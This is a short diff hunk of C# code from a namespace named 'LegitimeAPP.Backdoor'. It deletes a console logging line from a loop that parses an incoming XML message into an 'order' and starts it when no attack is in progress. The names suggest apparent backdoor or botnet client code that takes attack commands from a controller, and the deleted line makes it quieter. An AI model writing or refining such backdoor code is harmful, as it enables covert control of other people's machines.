@@ -165,7 +165,7 @@ namespace LegitimeAPP.Backdoor {
 
                     if ( !_attackInProgress ) {
                         
-                        Console.WriteLine(message) ; 
+                       
                         order.Change(Data<Order>.XmlToData(message)) ;
                         order.Start() ;
 
